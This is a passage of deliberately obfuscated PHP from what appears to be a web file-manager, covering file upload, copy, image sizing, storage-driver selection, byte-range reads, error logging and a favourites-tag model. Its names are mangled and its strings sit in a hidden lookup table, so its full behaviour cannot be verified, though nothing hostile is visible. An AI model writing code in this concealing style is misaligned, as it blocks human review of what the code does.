$ªŸú¬Ïä = $üï¨šãÄ->iconvApp($ªŸú¬Ïä); if (substr($ªŸú¬Ïä, strlen($ã¤ì­­ù)) == $ã¤ì­­ù) { $îŠ¹³’­ = !0; } $’ø–ÁøÜ = $Çäˆñê->upload($õ«İİØÏ, $ªŸú¬Ïä, $îŠ¹³’­); self::remove($Éã¼‰ÔÇ); Hook::trigger($ıçÕ™ÕŠ[1158], $üï¨šãÄ, $¾ÜÄîÉ§, $Çäˆñê, $õ«İİØÏ, $ºÖäœ™à, $’ø–ÁøÜ); self::copyMoveKeepInfo($üï¨šãÄ, $¾ÜÄîÉ§, $’ø–ÁøÜ); return $’ø–ÁøÜ; } private static function copyMoveKeepInfo($™×ñ”, $ãÚòŒ€¤, $êã é) { if (!$êã é) { return; } $÷á´ÇÆ× = $™×ñ”->info($ãÚòŒ€¤); if (!is_array($÷á´ÇÆ×)) { return; } IO::setModifyTime($êã é, $÷á´ÇÆ×[$_SERVER[ì™ı‰º¯][85]]); } public static function pathFather($­¼¾ç¬Â) { $°¿İ‡ = IO::init($­¼¾ç¬Â); $ó‚²åœ§ = $°¿İ‡->pathFather($°¿İ‡->path); return $°¿İ‡->getPathOuter($ó‚²åœ§); } public static function fileOut($Î‡İ†ö¶, $ìÏÆÍõÄ = false, $œÜ¨àĞ = false, $Á¡òŒäƒ = '') { $ñ¿öıà¨ = self::driverMake($Î‡İ†ö¶); if ($ñ¿öıà¨->isFileOutServer()) { return $ñ¿öıà¨->fileOutServer($Î‡İ†ö¶, $ìÏÆÍõÄ, $œÜ¨àĞ, $Á¡òŒäƒ); } return $ñ¿öıà¨->fileOut($Î‡İ†ö¶, $ìÏÆÍõÄ, $œÜ¨àĞ, $Á¡òŒäƒ); } public static function fileOutImage($«¥–¸œÃ, $èòäºè = 250) { $Ò™±µı = array(250, 600, 1200, 2000, 3000, 5000); for ($Œµç…… = 0; $Œµç…… < count($Ò™±µı); $Œµç……++) { if ($Œµç…… == 0 && $èòäºè <= $Ò™±µı[$Œµç……]) { $èòäºè = $Ò™±µı[$Œµç……]; break; } else { if ($èòäºè > $Ò™±µı[$Œµç…… - 1] && $èòäºè <= $Ò™±µı[$Œµç……]) { $èòäºè = $Ò™±µı[$Œµç……]; break; } else { if ($Œµç…… == count($Ò™±µı) - 1 && $èòäºè > $Ò™±µı[$Œµç……]) { $èòäºè = $Ò™±µı[$Œµç……]; break; } } } } $òáƒÈ˜« = self::driverMake($«¥–¸œÃ); if ($òáƒÈ˜«->isFileOutServer()) { return $òáƒÈ˜«->fileOutImageServer($«¥–¸œÃ, $èòäºè); } return $òáƒÈ˜«->fileOutImage($«¥–¸œÃ, $èòäºè); } private static function driverIsSame($Ö¡©æŸÑ, $­Ó‘÷š®) { $‡óø‰¼ =& $_SERVER[ì™ı‰º¯]; $ãéµàë = $Ö¡©æŸÑ->getType(); $„ÜÈğåß = $­Ó‘÷š®->getType(); if ($ãéµàë != $„ÜÈğåß) { return !1; } if ($ãéµàë == $‡óø‰¼[753]) { return !0; } if ($ãéµàë == $‡óø‰¼[106]) { return !0; } if ($Ö¡©æŸÑ->pathDriver == $­Ó‘÷š®->pathDriver) { return !0; } return !1; } public static function copyUpdate($¶­¼¾Æ„, $ç¢…÷¿ó) { $ÈÖ¦´ñ =& $_SERVER[ì™ı‰º¯]; if (!IO::exist($¶­¼¾Æ„)) { return !1; } if (!IO::exist($ç¢…÷¿ó)) { IO::mkdir($ç¢…÷¿ó); } $ìáĞ†¯Ş = array_to_keyvalue(self::listAllSimple($¶­¼¾Æ„), $ÈÖ¦´ñ[84]); $º©‘Š…‹ = array_to_keyvalue(self::listAllSimple($ç¢…÷¿ó), $ÈÖ¦´ñ[84]); $†³ææ¤Ì = array(); $ıÓ’Ğù› = array(); foreach ($ìáĞ†¯Ş as $Ö•êŸ¢ => $İò•¢†ô) { if (isset($º©‘Š…‹[$Ö•êŸ¢])) { if ($İò•¢†ô[$ÈÖ¦´ñ[75]] == 1) { continue; } if ($º©‘Š…‹[$Ö•êŸ¢][$ÈÖ¦´ñ[76]] == $İò•¢†ô[$ÈÖ¦´ñ[76]]) { continue; } } if ($İò•¢†ô[$ÈÖ¦´ñ[75]] == 1) { $ıÓ’Ğù›[] = $ç¢…÷¿ó . $ÈÖ¦´ñ[8] . trim($Ö•êŸ¢, $ÈÖ¦´ñ[8]); continue; } $Ãé½éÌ® = strstr(trim($Ö•êŸ¢, $ÈÖ¦´ñ[8]), $ÈÖ¦´ñ[8]) ? get_path_father($Ö•êŸ¢) : $ÈÖ¦´ñ[12]; $†³ææ¤Ì[] = array($ÈÖ¦´ñ[1159] => $İò•¢†ô[$ÈÖ¦´ñ[86]], $ÈÖ¦´ñ[1160] => rtrim($ç¢…÷¿ó, $ÈÖ¦´ñ[8]) . $ÈÖ¦´ñ[8] . $Ãé½éÌ®, $ÈÖ¦´ñ[1161] => $İò•¢†ô); } $²‚ß•û = array($ÈÖ¦´ñ[200] => $†³ææ¤Ì, $ÈÖ¦´ñ[75] => $ıÓ’Ğù›); Hook::trigger($ÈÖ¦´ñ[1162], $¶­¼¾Æ„, $ç¢…÷¿ó, $²‚ß•û); foreach ($ıÓ’Ğù› as $İò•¢†ô) { IO::mkdir($İò•¢†ô); } foreach ($†³ææ¤Ì as $İò•¢†ô) { IO::copy($İò•¢†ô[$ÈÖ¦´ñ[1159]], $İò•¢†ô[$ÈÖ¦´ñ[1160]], REPEAT_REPLACE); } } public static function fileSubstr($ß´¹¬ÓÄ, $ÜËƒ£¤, $½ ùïı¹ = false) { $á®“öÕ =& $_SERVER[ì™ı‰º¯]; $¨­¯÷ = self::driverMake($ß´¹¬ÓÄ); $›Ç÷ııĞ = $¨­¯÷->size($ß´¹¬ÓÄ); $»Ò¯Åö = $ÜËƒ£¤; $üÏÁŠà = $½ ùïı¹; if ($ÜËƒ£¤ < 0) { $ÜËƒ£¤ = $›Ç÷ııĞ + $ÜËƒ£¤; } if ($½ ùïı¹ === !1) { $½ ùïı¹ = $›Ç÷ııĞ - $ÜËƒ£¤; } if ($ÜËƒ£¤ + $½ ùïı¹ > $›Ç÷ııĞ) { $½ ùïı¹ = $›Ç÷ııĞ - $ÜËƒ£¤; } if (!$›Ç÷ııĞ && $¨­¯÷->getType() == $á®“öÕ[106] && !$¨­¯÷->exist($ß´¹¬ÓÄ)) { $Œ‹ŸÀ = get_path_this($ß´¹¬ÓÄ); $º¥ì©È• = parse_url_query($Œ‹ŸÀ); if (is_array($º¥ì©È•) && isset($º¥ì©È•[$á®“öÕ[32]])) { $Œ‹ŸÀ = urldecode($º¥ì©È•[$á®“öÕ[32]]); } throw new Exception($á®“öÕ[1163] . LNG($á®“öÕ[1164]) . $á®“öÕ[965] . clear_html($Œ‹ŸÀ) . $á®“öÕ[12]); } if ($½ ùïı¹ <= 0) { return $á®“öÕ[12]; } if ($ÜËƒ£¤ < 0 || $ÜËƒ£¤ >= $›Ç÷ııĞ || $½ ùïı¹ > 1024 * 1024 * 10) { throw new Exception("\x66\x69\154\x65\122\x65\x61\144\x20\x65\x72\x72\x6f\x72\x21\x20\x73\x74\141\x72\x74\75{$ÜËƒ£¤}\x3b\x6c\145\156\147\164\150\x3d{$½ ùïı¹}\x3b\x20\163\151\x7a\x65\75{$›Ç÷ııĞ}\73"); } $›â’›òÍ = $¨­¯÷->fileSubstr($ß´¹¬ÓÄ, $ÜËƒ£¤, $½ ùïı¹); if (!$›â’›òÍ && $½ ùïı¹ && isset($GLOBALS[$á®“öÕ[1165]])) { throw new Exception($GLOBALS[$á®“öÕ[1165]][$á®“öÕ[1166]]); } return $›â’›òÍ; } private static function driverMake(&$„¹×±¥”) { $Êµôò‡Ó =& $_SERVER[ì™ı‰º¯]; $¥í»°½İ = KodIO::parse($„¹×±¥”); if (!self::$driverListSystem) { $ÊÊê Êæ = Model($Êµôò‡Ó[763])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ÊÊê Êæ, $Êµôò‡Ó[399]); } if ($¥í»°½İ[$Êµôò‡Ó[33]] == KodIO::KOD_IO && !self::$driverListSystem[$¥í»°½İ[$Êµôò‡Ó[399]]]) { return !1; } $„¹×±¥” = $¥í»°½İ[$Êµôò‡Ó[1167]]; $¢ŞÑøÓæ = self::driverGet($¥í»°½İ, $„¹×±¥”); return $¢ŞÑøÓæ; } private static function driverGet($¿ªƒ®¤¹, &$ÍÏáÌĞ¸) { $»ªû¡¡ü =& $_SERVER[ì™ı‰º¯]; $šñíÁşœ = $¿ªƒ®¤¹[$»ªû¡¡ü[1168]]; $Ã§—­ø = $¿ªƒ®¤¹[$»ªû¡¡ü[399]]; switch ($¿ªƒ®¤¹[$»ªû¡¡ü[33]]) { case KodIO::KOD_IO: $Õ¸òéíê = self::$driverListSystem[$Ã§—­ø]; break; case KodIO::KOD_SOURCE: $ÍÏáÌĞ¸ = $Ã§—­ø . $ÍÏáÌĞ¸; $Õ¸òéíê = array($»ªû¡¡ü[1169] => $»ªû¡¡ü[1170], $»ªû¡¡ü[6] => $¿ªƒ®¤¹); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $‘­Âøïª = $GLOBALS[$»ªû¡¡ü[1171]]; self::$driverListUser = array_to_keyvalue($‘­Âøïª, $»ªû¡¡ü[399]); } $Õ¸òéíê = self::$driverListUser[$Ã§—­ø]; break; case KodIO::KOD_SHARE_LINK: $Õ¸òéíê = array($»ªû¡¡ü[1169] => $»ªû¡¡ü[1172], $»ªû¡¡ü[6] => $¿ªƒ®¤¹); $º©›œ´Ë = Action($»ªû¡¡ü[1173])->sharePathInfo($¿ªƒ®¤¹[$»ªû¡¡ü[84]]); $ÍÏáÌĞ¸ = $º©›œ´Ë[$»ªû¡¡ü[402]]; if (!$º©›œ´Ë[$»ªû¡¡ü[402]]) { $ªõŠñÒ’ = Model($»ªû¡¡ü[592])->getInfo($º©›œ´Ë[$»ªû¡¡ü[593]]); $ÍÏáÌĞ¸ = KodIO::clear($ªõŠñÒ’[$»ªû¡¡ü[1174]] . $¿ªƒ®¤¹[$»ªû¡¡ü[1167]]); $¿ªƒ®¤¹[$»ªû¡¡ü[486]] = $ªõŠñÒ’; $¿ªƒ®¤¹[$»ªû¡¡ü[1150]] = $ÍÏáÌĞ¸; $Õ¸òéíê = array($»ªû¡¡ü[1169] => $»ªû¡¡ü[1175], $»ªû¡¡ü[6] => $¿ªƒ®¤¹); } break; case KodIO::KOD_SHARE_ITEM: $Õ¸òéíê = array($»ªû¡¡ü[1169] => $»ªû¡¡ü[1176], $»ªû¡¡ü[6] => $¿ªƒ®¤¹); $ªõŠñÒ’ = Model($»ªû¡¡ü[592])->getInfo($¿ªƒ®¤¹[$»ªû¡¡ü[399]]); if ($ªõŠñÒ’[$»ªû¡¡ü[402]] == $»ªû¡¡ü[198]) { $ÍÏáÌĞ¸ = KodIO::clear($ªõŠñÒ’[$»ªû¡¡ü[1174]] . $¿ªƒ®¤¹[$»ªû¡¡ü[1167]]); $¿ªƒ®¤¹[$»ªû¡¡ü[486]] = $ªõŠñÒ’; $¿ªƒ®¤¹[$»ªû¡¡ü[1150]] = $ÍÏáÌĞ¸; $Õ¸òéíê = array($»ªû¡¡ü[1169] => $»ªû¡¡ü[1177], $»ªû¡¡ü[6] => $¿ªƒ®¤¹); } else { if (!$ÍÏáÌĞ¸) { $ÍÏáÌĞ¸ = $ªõŠñÒ’[$»ªû¡¡ü[402]]; } } break; default: $ÍÏáÌĞ¸ = $¿ªƒ®¤¹[$»ªû¡¡ü[84]]; $Õ¸òéíê = array($»ªû¡¡ü[1169] => $»ªû¡¡ü[1178]); break; } $› úÓôâ = $¿ªƒ®¤¹[$»ªû¡¡ü[84]]; if (!isset(self::$driverCache[$› úÓôâ])) { $„¼„æÍË = strtolower($Õ¸òéíê[$»ªû¡¡ü[95]]); $¨ù€ßÙ = $GLOBALS[$»ªû¡¡ü[6]][$»ªû¡¡ü[89]][$»ªû¡¡ü[822]]; $çŠÚ§ÍÙ = $»ªû¡¡ü[74] . (isset($¨ù€ßÙ[$„¼„æÍË]) ? $¨ù€ßÙ[$„¼„æÍË] : ucfirst($„¼„æÍË)); if (!class_exists($çŠÚ§ÍÙ)) { show_json("{$çŠÚ§ÍÙ}\40\x6e\157\x74\x20\145\x78\x69\163\164\163\x21", !1); } $¯»Ê¾Û = isset($Õ¸òéíê[$»ªû¡¡ü[6]]) ? $Õ¸òéíê[$»ªû¡¡ü[6]] : !1; self::$driverCache[$› úÓôâ] = new $çŠÚ§ÍÙ($¯»Ê¾Û); } $¹ÜÈ¨İô = self::$driverCache[$› úÓôâ]; $¹ÜÈ¨İô->pathDriver = $šñíÁşœ; $¹ÜÈ¨İô->pathBase = $»ªû¡¡ü[12]; if (isset($Õ¸òéíê[$»ªû¡¡ü[6]][$»ªû¡¡ü[1179]])) { $¹ÜÈ¨İô->pathBase = rtrim($Õ¸òéíê[$»ªû¡¡ü[6]][$»ªû¡¡ü[1179]], $»ªû¡¡ü[8]) . $»ªû¡¡ü[8]; $ÍÏáÌĞ¸ = $¹ÜÈ¨İô->pathBase . ltrim($ÍÏáÌĞ¸, $»ªû¡¡ü[8]); } $ÍÏáÌĞ¸ = $¹ÜÈ¨İô->getPath($ÍÏáÌĞ¸); if (isset($¿ªƒ®¤¹[$»ªû¡¡ü[1150]])) { $ÍÏáÌĞ¸ = $¿ªƒ®¤¹[$»ªû¡¡ü[1150]]; } $¹ÜÈ¨İô->path = $ÍÏáÌĞ¸; return $¹ÜÈ¨İô; } public static function errorTips($–Ë¶ˆÀò = false) { $ìÉÓ¬È =& $_SERVER[ì™ı‰º¯]; static $Ê‹ëğìñ = array(); $¢áÅ ‘À = 1000; if ($–Ë¶ˆÀò === -1) { return $Ê‹ëğìñ ? $Ê‹ëğìñ[count($Ê‹ëğìñ) - 1] : $ìÉÓ¬È[12]; } if ($–Ë¶ˆÀò === !1) { return implode($ìÉÓ¬È[231], $Ê‹ëğìñ); } if (count($Ê‹ëğìñ) >= $¢áÅ ‘À) { $Ê‹ëğìñ = array_slice($Ê‹ëğìñ, $¢áÅ ‘À * 0.5, $¢áÅ ‘À); } $Ê‹ëğìñ[] = $–Ë¶ˆÀò; write_log($ìÉÓ¬È[162] . ACTION . $ìÉÓ¬È[1180] . $–Ë¶ˆÀò, $ìÉÓ¬È[1181]); } public static function getLastError($åõôâÛ = '') { $şÙ¨ïÀ¼ = self::errorTips(-1); return $şÙ¨ïÀ¼ ? $şÙ¨ïÀ¼ : $åõôâÛ; } } goto F‰² ´£Ã˜; CÎŒ¼Ó½”ö: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\141\x76"; protected function cacheFunctionAlias($–¾Æ…úÊ) { $µƒˆ¶ş =& $_SERVER[ì™ı‰º¯]; return array($µƒˆ¶ş[1970] => array($µƒˆ¶ş[2353] . USER_ID, $µƒˆ¶ş[1971])); } protected function listData() { $­ğÓı =& $_SERVER[ì™ı‰º¯]; $§¥•ëƒş = array($­ğÓı[1661] => USER_ID, $­ğÓı[483] => array($­ğÓı[1974], 0)); $ å¼öî« = $­ğÓı[2354]; $ˆ²¦ÕØ = $this->field($ å¼öî«)->where($§¥•ëƒş)->order($­ğÓı[1977])->select(); return $ˆ²¦ÕØ ? $ˆ²¦ÕØ : array(); } protected function addToTag($˜ğêƒşŒ, $¹‰ªµ’ş) { $³Áàö› =& $_SERVER[ì™ı‰º¯]; if (!Model($³Áàö›[2118])->listData($¹‰ªµ’ş)) { return !1; } if (is_numeric($˜ğêƒşŒ)) { $øÜ—¤é¶ = Model($³Áàö›[821])->pathInfo($˜ğêƒşŒ); if (!$øÜ—¤é¶) { return !1; } } else { $øÜ—¤é¶ = IO::infoSimple($˜ğêƒşŒ); if (!$øÜ—¤é¶) { return !1; } $»Ï©ü® = $øÜ—¤é¶[$³Áàö›[32]]; $ğñãÜõ˜ = $øÜ—¤é¶[$³Áàö›[33]]; if (isset($øÜ—¤é¶[$³Áàö›[410]])) { $ğñãÜõ˜ = $øÜ—¤é¶[$³Áàö›[410]] == $³Áàö›[88] ? $³Áàö›[75] : $³Áàö›[200]; } } $ğàüÉ«Ğ = array($³Áàö›[1661] => USER_ID, $³Áàö›[483] => $¹‰ªµ’ş, $³Áàö›[421] => $˜ğêƒşŒ, $³Áàö›[422] => $ğñãÜõ˜ ? $ğñãÜõ˜ : $³Áàö›[416], $³Áàö›[420] => $»Ï©ü® ? $»Ï©ü® : $³Áàö›[12], $³Áàö›[1863] => 0); if ($this->where($ğàüÉ«Ğ)->find()) { return !1; } return $this->add($ğàüÉ«Ğ); } protected function removeFromTag($ˆõëº•İ, $ˆ±· ó¨) { $ùšå­ß” =& $_SERVER[ì™ı‰º¯]; if (!Model($ùšå­ß”[2118])->listData($ˆ±· ó¨)) { return !1; } if (is_array($ˆõëº•İ)) { $ˆõëº•İ = array($ùšå­ß”[7], $ˆõëº•İ); } $ëˆƒ²Ó® = array($ùšå­ß”[1661] => USER_ID, $ùšå­ß”[483] => $ˆ±· ó¨, $ùšå­ß”[421] => $ˆõëº•İ); return $this->where($ëˆƒ²Ó®)->delete(); } protected function removeByTag($ô¸ÈüÂˆ) { $‡–·Ä³ş =& $_SERVER[ì™ı‰º¯]; if (!$ô¸ÈüÂˆ) { return !1; } $ò’Ãöİê = array($‡–·Ä³ş[1661] => USER_ID, $‡–·Ä³ş[483] => $ô¸ÈüÂˆ); return $this->where($ò’Ãöİê)->delete(); } protected function removeBySource($¯ï…ÑÇ“) { $ƒÖ¨Á® =& $_SERVER[ì™ı‰º¯]; if (is_array($¯ï…ÑÇ“)) { $¯ï…ÑÇ“ = array($ƒÖ¨Á®[7], $¯ï…ÑÇ“); } $¨Ÿì²û† = array($ƒÖ¨Á®[1661] => USER_ID, $ƒÖ¨Á®[483] => array($ƒÖ¨Á®[1013], 0), $ƒÖ¨Á®[421] => $¯ï…ÑÇ“); return $this->where($¨Ÿì²û†)->delete(); } }